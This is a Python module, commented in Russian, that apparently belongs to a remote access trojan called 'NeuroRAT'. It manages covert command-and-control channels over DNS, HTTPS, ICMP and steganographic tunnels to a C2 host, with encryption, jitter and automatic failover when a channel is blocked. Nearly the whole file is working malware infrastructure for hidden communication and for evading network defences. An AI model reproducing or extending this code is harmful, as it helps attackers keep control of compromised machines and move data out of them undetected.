#!/usr/bin/env python3
"""
Channel Manager - Модуль управления скрытыми каналами связи
Обеспечивает координацию и переключение между различными каналами коммуникации
"""

import os
import time
import json
import random
import threading
from typing import Dict, List, Any, Optional, Tuple, Union, Callable

# Импортируем модули каналов связи
from modules.dns_tunnel import DNSTunnel
from modules.https_tunnel import HTTPSTunnel
from modules.icmp_tunnel import ICMPTunnel
from modules.crypto import EncryptionManager, CryptoUtils
from modules.stego_tunnel import StegoTunnel
from common.utils import get_logger, resolve_hostname

class ChannelManager:
    """
    Класс для управления скрытыми каналами связи
    Координирует работу различных туннелей и обеспечивает отказоустойчивость
    """
    
    # Состояния каналов
    CHANNEL_STATE_UNKNOWN = 0  # Статус неизвестен
    CHANNEL_STATE_GOOD = 1     # Канал работает хорошо
    CHANNEL_STATE_DEGRADED = 2 # Канал работает с ошибками
    CHANNEL_STATE_BLOCKED = 3  # Канал заблокирован
    
    def __init__(
        self,
        c2_host: str = "neurorat.com",
        c2_ip: str = None,
        channels_config: Dict[str, Dict] = None,
        channel_check_interval: int = 60,
        primary_channel: str = "https",
        data_callback: Callable[[bytes], None] = None,
        encryption_method: str = "aes"
    ):
        """
        Инициализация менеджера каналов
        
        Args:
            c2_host: Хост C2-сервера
            c2_ip: IP-адрес C2-сервера (для ICMP)
            channels_config: Конфигурация каналов связи
            channel_check_interval: Интервал проверки каналов (секунды)
            primary_channel: Основной канал по умолчанию
            data_callback: Колбэк для полученных данных
            encryption_method: Метод шифрования данных
        """
        self.c2_host = c2_host
        self.c2_ip = c2_ip or resolve_hostname(self.c2_host)
        self.channels_config = channels_config or {}
        self.channel_check_interval = max(30, channel_check_interval)
        self.primary_channel = primary_channel
        self.data_callback = data_callback
        
        # Инициализация логирования через общий утилитный логгер
        self.logger = get_logger("channel_manager")
        
        # Инициализируем каналы связи
        self.channels = {}
        self.channel_states = {}
        self.active_channel = None
        
        # Инициализируем менеджер шифрования
        self.encryption_manager = EncryptionManager(default_method=encryption_method)
        
        # Мьютекс для доступа к каналам
        self.channels_lock = threading.RLock()
        
        # Статус работы менеджера
        self.is_running = False
        self.monitoring_thread = None
        
        # Счетчики и статистика
        self.stats = {
            "sent_messages": 0,
            "received_messages": 0,
            "failed_sends": 0,
            "channel_switches": 0,
            "start_time": time.time(),
            "channels": {}
        }
        
        # Инициализируем доступные каналы
        self._initialize_channels()
    
    def _initialize_channels(self) -> None:
        """Инициализирует доступные каналы связи"""
        with self.channels_lock:
            # Создаем колбэк-функцию для каналов
            def create_channel_callback(channel_name):
                def callback(data):
                    self._handle_channel_data(channel_name, data)
                return callback
            
            # Пытаемся инициализировать все доступные типы каналов
            
            # DNS-канал
            try:
                dns_config = self.channels_config.get("dns", {})
                dns_tunnel = DNSTunnel(
                    c2_domain=self.c2_host,
                    query_interval=dns_config.get("query_interval", 1.0),
                    jitter=dns_config.get("jitter", 0.3),
                    max_chunk_size=dns_config.get("max_chunk_size", 30),
                    callback=create_channel_callback("dns")
                )
                self.channels["dns"] = dns_tunnel
                self.channel_states["dns"] = self.CHANNEL_STATE_UNKNOWN
                self.stats["channels"]["dns"] = {
                    "sent": 0,
                    "received": 0,
                    "errors": 0,
                    "last_active": 0
                }
                self.logger.info("DNS-канал инициализирован")
            except Exception as e:
                self.logger.error(f"Ошибка инициализации DNS-канала: {e}")
            
            # HTTPS-канал
            try:
                https_config = self.channels_config.get("https", {})
                https_tunnel = HTTPSTunnel(
                    c2_host=self.c2_host,
                    c2_port=https_config.get("port", 443),
                    paths=https_config.get("paths"),
                    user_agents=https_config.get("user_agents"),
                    poll_interval=https_config.get("poll_interval", 5.0),
                    jitter=https_config.get("jitter", 0.3),
                    max_chunk_size=https_config.get("max_chunk_size", 1024),
                    callback=create_channel_callback("https")
                )
                self.channels["https"] = https_tunnel
                self.channel_states["https"] = self.CHANNEL_STATE_UNKNOWN
                self.stats["channels"]["https"] = {
                    "sent": 0,
                    "received": 0,
                    "errors": 0,
                    "last_active": 0
                }
                self.logger.info("HTTPS-канал инициализирован")
            except Exception as e:
                self.logger.error(f"Ошибка инициализации HTTPS-канала: {e}")
            
            # ICMP-канал (требует прав администратора)
            try:
                icmp_config = self.channels_config.get("icmp", {})
                icmp_tunnel = ICMPTunnel(
                    c2_host=self.c2_ip,
                    session_id=icmp_config.get("session_id"),
                    poll_interval=icmp_config.get("poll_interval", 1.0),
                    jitter=icmp_config.get("jitter", 0.3),
                    max_chunk_size=icmp_config.get("max_chunk_size", 32),
                    callback=create_channel_callback("icmp")
                )
                self.channels["icmp"] = icmp_tunnel
                self.channel_states["icmp"] = self.CHANNEL_STATE_UNKNOWN
                self.stats["channels"]["icmp"] = {
                    "sent": 0,
                    "received": 0,
                    "errors": 0,
                    "last_active": 0
                }
                self.logger.info("ICMP-канал инициализирован")
            except Exception as e:
                self.logger.error(f"Ошибка инициализации ICMP-канала: {e}")
            
            # Stego-канал (стеганографический туннель)
            try:
                stego_config = self.channels_config.get("stego", {})
                stego_tunnel = StegoTunnel(
                    c2_host=self.c2_host,
                    c2_port=stego_config.get("port", 443),
                    upload_path=stego_config.get("upload_path", "/files/upload"),
                    download_path=stego_config.get("download_path", "/files/download"),
                    poll_interval=stego_config.get("poll_interval", 60.0),
                    jitter=stego_config.get("jitter", 0.3),
                    stego_method=stego_config.get("method", "metadata"),
                    image_pool=stego_config.get("image_pool"),
                    callback=create_channel_callback("stego")
                )
                self.channels["stego"] = stego_tunnel
                self.channel_states["stego"] = self.CHANNEL_STATE_UNKNOWN
                self.stats["channels"]["stego"] = {
                    "sent": 0,
                    "received": 0,
                    "errors": 0,
                    "last_active": 0
                }
                self.logger.info("Stego-канал инициализирован")
            except Exception as e:
                self.logger.error(f"Ошибка инициализации Stego-канала: {e}")
            
            # Устанавливаем активный канал
            if self.primary_channel in self.channels:
                self.active_channel = self.primary_channel
            elif len(self.channels) > 0:
                self.active_channel = list(self.channels.keys())[0]
            
            if self.active_channel:
                self.logger.info(f"Основной канал: {self.active_channel}")
            else:
                self.logger.error("Не удалось инициализировать ни один канал связи")
    
    def start(self) -> bool:
        """
        Запускает менеджер каналов и все активные каналы
        
        Returns:
            bool: True если запуск успешен
        """
        if self.is_running:
            return False
        
        with self.channels_lock:
            if not self.channels:
                self.logger.error("Нет инициализированных каналов связи")
                return False
            
            # Запускаем активный канал
            if self.active_channel and self.active_channel in self.channels:
                channel = self.channels[self.active_channel]
                if channel.start():
                    self.logger.info(f"Канал {self.active_channel} запущен")
                else:
                    self.logger.warning(f"Не удалось запустить канал {self.active_channel}")
                    # Попытка запустить другой канал
                    self._switch_channel()
            
            # Запускаем мониторинг каналов
            self.is_running = True
            self.monitoring_thread = threading.Thread(
                target=self._monitoring_loop,
                daemon=True,
                name="Channel-Monitor"
            )
            self.monitoring_thread.start()
            
            self.logger.info("Менеджер каналов запущен")
            return True
    
    def stop(self) -> None:
        """Останавливает менеджер каналов и все активные каналы"""
        self.is_running = False
        
        with self.channels_lock:
            # Останавливаем все каналы
            for name, channel in self.channels.items():
                try:
                    channel.stop()
                    self.logger.info(f"Канал {name} остановлен")
                except Exception as e:
                    self.logger.error(f"Ошибка при остановке канала {name}: {e}")
        
        # Ожидаем завершения потока мониторинга
        if self.monitoring_thread and self.monitoring_thread.is_alive():
            self.monitoring_thread.join(timeout=3)
        
        self.logger.info("Менеджер каналов остановлен")
    
    def send(self, data: bytes) -> bool:
        """
        Отправляет данные через активный канал связи
        
        Args:
            data: Данные для отправки
            
        Returns:
            bool: True если отправка успешна
        """
        if not self.is_running:
            self.logger.error("Менеджер каналов не запущен")
            return False
        
        with self.channels_lock:
            if not self.active_channel or self.active_channel not in self.channels:
                self.logger.error("Нет активного канала связи")
                return False
            
            # Шифруем данные
            try:
                encrypted_data = self.encryption_manager.encrypt(data)
                # Преобразуем в JSON и затем в байты
                json_data = json.dumps(encrypted_data).encode('utf-8')
            except Exception as e:
                self.logger.error(f"Ошибка шифрования данных: {e}")
                return False
            
            # Отправляем через активный канал
            try:
                channel = self.channels[self.active_channel]
                success = channel.send(json_data)
                
                if success:
                    # Обновляем статистику
                    self.stats["sent_messages"] += 1
                    self.stats["channels"][self.active_channel]["sent"] += 1
                    self.stats["channels"][self.active_channel]["last_active"] = time.time()
                    return True
                else:
                    # Обновляем статистику ошибок
                    self.stats["failed_sends"] += 1
                    self.stats["channels"][self.active_channel]["errors"] += 1
                    
                    # Переключаемся на другой канал при ошибке
                    self.logger.warning(f"Ошибка отправки через канал {self.active_channel}")
                    self._switch_channel()
                    return False
            
            except Exception as e:
                self.logger.error(f"Ошибка отправки данных: {e}")
                self.stats["failed_sends"] += 1
                self._switch_channel()
                return False
    
    def _handle_channel_data(self, channel_name: str, data: bytes) -> None:
        """
        Обрабатывает данные, полученные от канала
        
        Args:
            channel_name: Имя канала, от которого получены данные
            data: Полученные данные
        """
        try:
            # Обновляем статистику
            self.stats["channels"][channel_name]["received"] += 1
            self.stats["channels"][channel_name]["last_active"] = time.time()
            
            # Преобразуем JSON-строку в словарь
            encrypted_data = json.loads(data.decode('utf-8'))
            
            # Дешифруем данные
            decrypted_data = self.encryption_manager.decrypt(encrypted_data)
            
            # Обновляем статистику
            self.stats["received_messages"] += 1
            
            # Если канал не активный, но работает хорошо, рассмотрим его для использования
            if (channel_name != self.active_channel and 
                self.channel_states[channel_name] != self.CHANNEL_STATE_BLOCKED):
                self.channel_states[channel_name] = self.CHANNEL_STATE_GOOD
            
            # Вызываем колбэк с расшифрованными данными
            if self.data_callback:
                self.data_callback(decrypted_data)
        
        except json.JSONDecodeError:
            self.logger.warning(f"Получены некорректные JSON-данные от канала {channel_name}")
        except Exception as e:
            self.logger.error(f"Ошибка обработки данных от канала {channel_name}: {e}")
    
    def _monitoring_loop(self) -> None:
        """Цикл мониторинга состояния каналов"""
        last_check_time = 0
        
        while self.is_running:
            current_time = time.time()
            
            # Проверяем каналы с заданным интервалом
            if current_time - last_check_time >= self.channel_check_interval:
                self._check_channels()
                last_check_time = current_time
            
            # Проверяем, нужно ли переключиться на другой канал
            with self.channels_lock:
                if (self.active_channel and 
                    self.channel_states.get(self.active_channel) == self.CHANNEL_STATE_BLOCKED):
                    self.logger.warning(f"Канал {self.active_channel} заблокирован, переключаемся")
                    self._switch_channel()
            
            # Спим некоторое время
            time.sleep(5)
    
    def _check_channels(self) -> None:
        """Проверяет состояние всех каналов"""
        with self.channels_lock:
            self.logger.debug("Проверка состояния каналов")
            
            for name, channel in self.channels.items():
                # Пропускаем неактивные каналы
                if name != self.active_channel and not channel.is_running:
                    continue
                
                # Проверяем статистику канала
                try:
                    # Получаем статистику канала, если доступна
                    if hasattr(channel, 'get_statistics'):
                        stats = channel.get_statistics()
                        
                        # Анализируем статистику ошибок
                        errors = stats.get("errors", 0) + stats.get("failed_requests", 0)
                        error_ratio = errors / max(1, stats.get("sent_packets", 0) + stats.get("sent_requests", 0))
                        
                        if error_ratio > 0.5:  # Больше 50% ошибок
                            self.channel_states[name] = self.CHANNEL_STATE_BLOCKED
                        elif error_ratio > 0.2:  # Больше 20% ошибок
                            self.channel_states[name] = self.CHANNEL_STATE_DEGRADED
                        else:
                            self.channel_states[name] = self.CHANNEL_STATE_GOOD
                    
                    # Если канал не запущен, пробуем запустить его
                    if not channel.is_running and name != self.active_channel:
                        channel.start()
                
                except Exception as e:
                    self.logger.error(f"Ошибка проверки канала {name}: {e}")
                    self.channel_states[name] = self.CHANNEL_STATE_DEGRADED
            
            # Логируем текущее состояние
            state_str = ", ".join([f"{name}: {state}" for name, state in self.channel_states.items()])
            self.logger.debug(f"Состояние каналов: {state_str}")
    
    def _switch_channel(self) -> bool:
        """
        Переключается на другой доступный канал
        
        Returns:
            bool: True если переключение успешно
        """
        with self.channels_lock:
            # Получаем список доступных каналов, отсортированный по приоритету
            available_channels = [
                name for name, state in self.channel_states.items()
                if state != self.CHANNEL_STATE_BLOCKED and name != self.active_channel
            ]
            
            if not available_channels:
                self.logger.warning("Нет доступных каналов для переключения")
                return False
            
            # Останавливаем текущий канал, если он активен
            if self.active_channel and self.channels[self.active_channel].is_running:
                try:
                    self.channels[self.active_channel].stop()
                except Exception as e:
                    self.logger.error(f"Ошибка остановки канала {self.active_channel}: {e}")
            
            # Выбираем новый канал
            # Приоритет: primary_channel > GOOD > UNKNOWN > DEGRADED
            if self.primary_channel in available_channels:
                new_channel = self.primary_channel
            else:
                # Сортируем по состоянию
                good_channels = [name for name in available_channels 
                              if self.channel_states[name] == self.CHANNEL_STATE_GOOD]
                
                unknown_channels = [name for name in available_channels 
                                 if self.channel_states[name] == self.CHANNEL_STATE_UNKNOWN]
                
                degraded_channels = [name for name in available_channels 
                                  if self.channel_states[name] == self.CHANNEL_STATE_DEGRADED]
                
                if good_channels:
                    new_channel = random.choice(good_channels)
                elif unknown_channels:
                    new_channel = random.choice(unknown_channels)
                elif degraded_channels:
                    new_channel = random.choice(degraded_channels)
                else:
                    # Не должны попасть сюда, но на всякий случай
                    new_channel = random.choice(available_channels)
            
            # Запускаем новый канал
            try:
                if self.channels[new_channel].start():
                    self.active_channel = new_channel
                    self.stats["channel_switches"] += 1
                    self.logger.info(f"Переключение на канал {new_channel}")
                    return True
                else:
                    self.logger.error(f"Не удалось запустить канал {new_channel}")
                    # Помечаем как проблемный
                    self.channel_states[new_channel] = self.CHANNEL_STATE_DEGRADED
                    # Рекурсивно пытаемся переключиться на другой канал
                    return self._switch_channel()
            
            except Exception as e:
                self.logger.error(f"Ошибка запуска канала {new_channel}: {e}")
                self.channel_states[new_channel] = self.CHANNEL_STATE_DEGRADED
                return False
    
    def get_statistics(self) -> Dict[str, Any]:
        """
        Возвращает статистику работы менеджера каналов
        
        Returns:
            Dict: Статистика работы
        """
        stats = self.stats.copy()
        stats["uptime"] = time.time() - stats["start_time"]
        stats["active_channel"] = self.active_channel
        stats["channel_states"] = {name: state for name, state in self.channel_states.items()}
        
        # Добавляем статистику каналов
        for name, channel in self.channels.items():
            if hasattr(channel, 'get_statistics'):
                try:
                    stats["channels"][name].update(channel.get_statistics())
                except Exception:
                    pass
        
        return stats

# Тестирование модуля
if __name__ == "__main__":
    logging.basicConfig(level=logging.INFO)
    
    def data_callback(data: bytes) -> None:
        print(f"Получены данные: {data.decode('utf-8')}")
    
    # Создаем менеджер каналов с настройками по умолчанию
    manager = ChannelManager(
        c2_host="httpbin.org",  # Тестовый сервис
        c2_ip="127.0.0.1",      # Для ICMP-туннеля (локальный тест)
        primary_channel="https",
        data_callback=data_callback
    )
    
    if manager.start():
        try:
            # Отправляем тестовое сообщение
            manager.send(b"Hello from NeuroRAT Channel Manager!")
            
            # Даем время на обработку
            time.sleep(10)
            
            # Выводим статистику
            stats = manager.get_statistics()
            print(f"Активный канал: {stats['active_channel']}")
            print(f"Отправлено сообщений: {stats['sent_messages']}")
            print(f"Получено сообщений: {stats['received_messages']}")
            print(f"Ошибок отправки: {stats['failed_sends']}")
            print(f"Переключений канала: {stats['channel_switches']}")
            
            # Тестируем переключение канала
            print("Тестирование переключения канала...")
            manager._switch_channel()
            time.sleep(5)
            
            stats = manager.get_statistics()
            print(f"Новый активный канал: {stats['active_channel']}")
        
        finally:
            manager.stop()
    else:
        print("Не удалось запустить менеджер каналов") 